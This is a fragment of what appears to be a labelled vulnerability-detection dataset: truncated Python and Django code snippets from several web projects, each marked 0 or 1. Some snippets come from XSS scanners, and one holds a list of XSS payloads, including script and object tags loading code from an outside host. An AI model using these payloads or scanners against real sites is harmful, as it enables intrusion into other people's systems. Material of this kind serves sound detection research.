\"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog", "label": 0}, {"snippet_id": 49205, "code": " new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by(self): new_query=[] for column in self.query_order.split('.'):", "label": 0}, {"snippet_id": 34271, "code": "\tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t ", "label": 0}, {"snippet_id": 13672, "code": "\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/", "label": 1}, {"snippet_id": 47879, "code": "+user.displayName) au.set_password(pw1) else: logging.log(logging.INFO, \"Failed to set password for: \" +user.displayName) au.email=mail au.save() user.save() else: username=str(request.POST[\"username\"]", "label": 1}, {"snippet_id": 7505, "code": "'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/", "label": 0}, {"snippet_id": 21236, "code": ", 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 1}, {"snippet_id": 199, "code": "\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri", "label": 1}, {"snippet_id": 32128, "code": " filter(self, table, mappings, filter_string): \"\"\"Naive case-insensitive search.\"\"\" q=filter_string.lower() return[mapping for mapping in mappings if q in mapping.ud.lower()] def get_rules_as_json(mapping", "label": 0}, {"snippet_id": 7891, "code": "+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$", "label": 0}, {"snippet_id": 29968, "code": " save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys) \ttry: \t\tfunct.logging(\"local\", \"users.py \texcept: \t", "label": 0}, {"snippet_id": 21679, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$", "label": 0}, {"snippet_id": 31207, "code": " \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \ttable_stat=sql.select_table_metrics(user_id.value) \ttemplate=template.render(table_stat=sql.select_table_metrics", "label": 0}, {"snippet_id": 31030, "code": "(slave) \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script", "label": 0}, {"snippet_id": 52906, "code": ")) def list_editor_coordinators(request): coordinators=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/list_editor_coordinators", "label": 0}, {"snippet_id": 4442, "code": "(Fuzzer): \"\"\"Code Payload\"\"\" homograph={ 'a': '\\u0430', 'c': '\\u03F2', 'd': '\\u0501', 'e': '\\u0435', 'h': '\\u04BB', 'i': '\\u0456', 'j': '\\u0458', 'l': '\\u04CF', 'o': '\\u043E', 'p': '\\u0440', 'r': '\\u0433'", "label": 0}, {"snippet_id": 13572, "code": "'xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r", "label": 0}, {"snippet_id": 54539, "code": "['title', 'category', 'content'] class CommentForm(forms.ModelForm): class Meta: model=Comment fields=['content'] class UserDetail(DetailView): model=User template_name='user.html' def get_context_data", "label": 0}, {"snippet_id": 49376, "code": " self.value=value self.query_params=query_params def get_title(self): return self.label def get_url(self): return self.get_url_with_query_params({ self.field_name: self.value }) def is_active(self): if", "label": 0}, {"snippet_id": 24525, "code": " msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green'", "label": 0}, {"snippet_id": 51310, "code": " 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password') def save_model(self, request, obj, form, change): if 'internet_nl_api_password' in form.changed_data: f=Fernet(settings.FIELD_ENCRYPTION_KEY", "label": 0}, {"snippet_id": 21136, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', ", "label": 0}, {"snippet_id": 6283, "code": ".getboolean(self.section, 'debug') @property def syslog_debug(self): \"\"\" Set to True to log debug messages to syslog(also requires syslog_socket)(boolean). \"\"\" return self.config.getboolean(self.section", "label": 0}, {"snippet_id": 24221, "code": "=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports", "label": 0}, {"snippet_id": 25276, "code": ".scheme['fields']): fname, label, size=field data.append(value.get(fname, \"\")) if '_legacy' in value and not data[-1]: data[-1]=value.get('_legacy', '') return data def render(self, name: str, value, attrs", "label": 0}, {"snippet_id": 54996, "code": ") def update_translation_memory(changed_translation_pks, project, locale): \"\"\"Update translation memory for a list of translations. \"\"\" memory_entries=[ TranslationMemoryEntry( source=t.entity.string, target", "label": 0}, {"snippet_id": 54884, "code": " get_object_or_404 from django.views.decorators.http import( require_POST ) from pontoon.base.models import( ChangedEntityLocale, Entity, Locale, Project, ProjectLocale, TranslationMemoryEntry, Translation, ) from", "label": 0}, {"snippet_id": 43000, "code": ".append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields", "label": 0}, {"snippet_id": 28000, "code": "\"\"Handle a get request.\"\"\" self.render( 'login.html',{ 'apiKey': local_config.ProjectConfig().get('firebase.api_key'), 'authDomain': auth.auth_domain(), 'dest': self.request.get('dest'), }) class SessionLoginHandler", "label": 1}, {"snippet_id": 17718, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset", "label": 0}, {"snippet_id": 8429, "code": ")/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT", "label": 0}, {"snippet_id": 36375, "code": " at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t", "label": 0}, {"snippet_id": 28267, "code": ": \t\tif master[0] !=None: \t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save) \t\t \tstderr=funct.upload_and_restart(serv, cfg, just_save=save) \t\t \tfunct.diff_config(oldcfg, cfg) \t \t \t \t \t \t\t \tos.system", "label": 0}, {"snippet_id": 18543, "code": "<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$", "label": 0}, {"snippet_id": 51639, "code": " os.environ.get('DB_PASSWORD', 'dashboard'), 'HOST': os.environ.get('DB_HOST', 'mysql'), 'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'),{}) } } DATABASE=os.environ.get('DJANGO_DATABASE", "label": 0}, {"snippet_id": 18917, "code": "'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if", "label": 0}, {"snippet_id": 981, "code": "\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body", "label": 1}, {"snippet_id": 52983, "code": " coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'], workflows): raise PopupException(_('You don\\'t have access to the workflow of this coordinator.')) return", "label": 0}, {"snippet_id": 16719, "code": "*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 1}, {"snippet_id": 15039, "code": "'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' )", "label": 0}, {"snippet_id": 4972, "code": " x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y", "label": 0}, {"snippet_id": 132, "code": " is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting", "label": 1}, {"snippet_id": 35855, "code": "(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError", "label": 0}, {"snippet_id": 39961, "code": "): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"", "label": 0}, {"snippet_id": 51519, "code": ".middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',", "label": 0}, {"snippet_id": 4197, "code": " logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\":", "label": 0}, {"snippet_id": 53315, "code": "-message', ex)) def list_editor_bundles(request): bundles=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')] return render('editor/list_editor_bundles.mako',", "label": 0}, {"snippet_id": 19712, "code": " from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text", "label": 0}, {"snippet_id": 22098, "code": "[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root", "label": 0}, {"snippet_id": 11665, "code": ".password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url", "label": 0}, {"snippet_id": 36600, "code": ", global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on", "label": 1}, {"snippet_id": 10721, "code": " check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__", "label": 0}, {"snippet_id": 49000, "code": "'get_absolute_url'): raise SmartListException(\"Please make sure your model{} implements get_absolute_url()\".format(type(self.object))) return format_html( '<td><a href=\"{}\">{}</a></td>', self.object.get_absolute_url", "label": 0}, {"snippet_id": 40972, "code": " \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost", "label": 0}, {"snippet_id": 6, "code": " req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def", "label": 0}, {"snippet_id": 48208, "code": " action_add_multiple_media(request: HttpRequest): try: category: str=request.POST[\"category\"] files=request.FILES.getlist('files') user: Profile=get_current_user(request) for f in files: handle_file(user, str(f.name),", "label": 0}, {"snippet_id": 1998, "code": ".api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)", "label": 0}, {"snippet_id": 16959, "code": "/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 33686, "code": "\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents", "label": 0}, {"snippet_id": 23166, "code": "]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups", "label": 0}, {"snippet_id": 22183, "code": "), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request", "label": 0}, {"snippet_id": 26973, "code": " Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):", "label": 0}, {"snippet_id": 3658, "code": " req import utils.logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update", "label": 0}, {"snippet_id": 53777, "code": " import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() for page in range(4): send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"", "label": 1}, {"snippet_id": 25821, "code": ".type==Question.TYPE_FILE: field=forms.FileField( label=q.question, required=q.required, help_text=help_text, initial=initial.file if initial else None, widget=UploadedFileWidget(position=pos, event=event", "label": 0}, {"snippet_id": 30408, "code": "\trows=form.getvalue('rows') \twaf=form.getvalue('waf') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') ", "label": 0}, {"snippet_id": 7825, "code": "/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(", "label": 0}, {"snippet_id": 20224, "code": " data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store", "label": 0}, {"snippet_id": 1565, "code": " name, \"url\": url}) except: print \"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids", "label": 0}, {"snippet_id": 4489, "code": "(256): yield chr(i) @staticmethod def fuzzUnicode(cnt=1): for i in xrange(cnt): yield unichr(random.randint(0, 0xffff)) @staticmethod def fuzzUnicodeReplace(s, cnt=1): s=s.replace(\"A\", \"\u0100\", cnt) s=s.replace", "label": 0}, {"snippet_id": 54692, "code": "=[ 'markdown.extensions.extra', 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return context def post(self, request, *args, **kwargs): self.object=self.get_object() form=self.get_form", "label": 0}, {"snippet_id": 32347, "code": " url) thread=threading.Thread(target=_open_url, args=(url,)) thread.start() elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')): print(' Try loading %s/docs/README.md' % origin) elif os.path", "label": 0}, {"snippet_id": 45303, "code": "=coordinator_data['properties']['workflow']) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data", "label": 0}, {"snippet_id": 25788, "code": "', initial=initial.options.first() if initial else None, ) elif q.type==Question.TYPE_CHOICE_MULTIPLE: field=forms.ModelMultipleChoiceField( queryset=q.options, label=q.question, required=q.required, help_text", "label": 0}, {"snippet_id": 24615, "code": "\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self", "label": 0}, {"snippet_id": 203, "code": "(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact", "label": 1}, {"snippet_id": 3738, "code": " impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url", "label": 0}, {"snippet_id": 37817, "code": " from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils", "label": 1}, {"snippet_id": 28243, "code": "('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master", "label": 0}, {"snippet_id": 29598, "code": "\t\treturn stdout.read().decode(encoding='UTF-8') \t\telif kwargs.get('retunr_err')==1: \t\t\treturn stderr.read().decode(encoding='UTF-8') \t\telse: \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\t\t \t\tfor line", "label": 0}, {"snippet_id": 48504, "code": " u. rights < 2: return HttpResponseRedirect(\"/admin?error=noyb\") current_reservation.submitted=True current_reservation.save() res: HttpResponseRedirect=HttpResponseRedirect(forward_url) return res def", "label": 0}, {"snippet_id": 18505, "code": "'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 36103, "code": " default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not", "label": 0}, {"snippet_id": 9023, "code": "'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"),", "label": 0}, {"snippet_id": 32190, "code": " __future__ import print_function import SimpleHTTPServer import SocketServer import argparse import codecs import os import re import socket import sys import threading import time import webbrowser from", "label": 0}, {"snippet_id": 5078, "code": "</math>', '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events", "label": 0}, {"snippet_id": 15611, "code": " self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self", "label": 0}, {"snippet_id": 2294, "code": ",\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging", "label": 0}, {"snippet_id": 54941, "code": "'strings_with_warnings', 'unreviewed_strings', ]) locale.aggregate_stats() for project in projects: project.aggregate_stats() ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats()", "label": 0}, {"snippet_id": 29150, "code": ".get_setting('haproxy_dir') \tver=check_haproxy_version(serv) \tos.system(\"cp scripts/%s.\" % script) \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" +proxy+ \t\t\t\t\"", "label": 0}, {"snippet_id": 13934, "code": ", name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P", "label": 0}, {"snippet_id": 11770, "code": ")university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views", "label": 0}, {"snippet_id": 3942, "code": ".api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print", "label": 0}, {"snippet_id": 22332, "code": ".password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls'", "label": 0}, {"snippet_id": 20438, "code": "(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all", "label": 0}, {"snippet_id": 54829, "code": "'HTTP_USER_AGENT']) return context def test_func(self): return self.request.user==self.get_object().author class ArticleDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"\"\" model=Article success_url='", "label": 0}, {"snippet_id": 47579, "code": ":<br/>')) f.add_content(TextArea(name='notes', text=str(profile.notes))) else: f.add_content(PlainText(\"Email address: \")) f.add_content(TextField(name='email')) f.add_content(PlainText(\"Display name: ", "label": 0}, {"snippet_id": 48859, "code": " \").title() class QueryParamsMixin(object): def get_url_with_query_params(self, new_query_dict): query=dict(self.query_params).copy() for key, value in query.items(): if type(value)==list: query[key]=value", "label": 0}, {"snippet_id": 16676, "code": "+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 40394, "code": ") \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)", "label": 0}, {"snippet_id": 22529, "code": ".views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if", "label": 0}, {"snippet_id": 47325, "code": " django.shortcuts import redirect from django.contrib.auth.models import User from. import page_skeleton, magic from.form import Form, TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField", "label": 0}, {"snippet_id": 16405, "code": ".views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views", "label": 0}, {"snippet_id": 7155, "code": ", name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id", "label": 0}, {"snippet_id": 6542, "code": "(self): \"\"\" Raven DSN(string) for logging exceptions to Sentry. \"\"\" return self.config.get(self.section, 'raven_dsn') @property def content_packages(self): \"\"\" Get list of tuples with packages and paths", "label": 0}, {"snippet_id": 2928, "code": "=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0", "label": 0}, {"snippet_id": 34256, "code": "): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self", "label": 0}, {"snippet_id": 23431, "code": "]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider", "label": 0}, {"snippet_id": 52830, "code": " reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs", "label": 0}, {"snippet_id": 7147, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url", "label": 0}, {"snippet_id": 2361, "code": "'': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param", "label": 0}, {"snippet_id": 41668, "code": " \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t", "label": 0}, {"snippet_id": 19777, "code": "(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning", "label": 0}, {"snippet_id": 53119, "code": "=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status']=0 response['id']=coordinator_doc.id response['message']=_(", "label": 0}, {"snippet_id": 53043, "code": " @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get('coordinator', '{}')) if coordinator_data.get('id'): coordinator_doc", "label": 0}, {"snippet_id": 29411, "code": " \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div>') \t \tfirewalld_commands=[] \t \tfor line in conf: \t\tif \"bind\" in line: \t\t\tbind=line.split(\":\") \t\t\tbind", "label": 0}, {"snippet_id": 52058, "code": " d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission", "label": 1}, {"snippet_id": 1485, "code": " scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')", "label": 1}, {"snippet_id": 27766, "code": ".set_status(status) def handle_exception(self, exception, _): \"\"\"Catch exception and format it properly.\"\"\" try: status=500 values={ 'message': exception.message, 'email': helpers.get_user_email(), 'traceDump", "label": 0}, {"snippet_id": 44290, "code": "=workflow_id else: wid['uuid']=workflow_id doc=Document2.objects.get(type='oozie-workflow2', **wid) workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user)", "label": 0}, {"snippet_id": 723, "code": ".urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text", "label": 1}, {"snippet_id": 22391, "code": "'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile", "label": 0}, {"snippet_id": 47657, "code": " ihre Werbung stehen\")) if profile: f.add_content(PlainText('<br /><br />Change password(leave blank in order to not change it):')) else: f.add_content(PlainText('<br />Choose a password: ')) f.add_content", "label": 0}, {"snippet_id": 44906, "code": "\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml'", "label": 0}, {"snippet_id": 28352, "code": "(interpolation=ExtendedInterpolation()) \t\tconfig.read(path_config) \texcept: \t\tprint('Content-type: 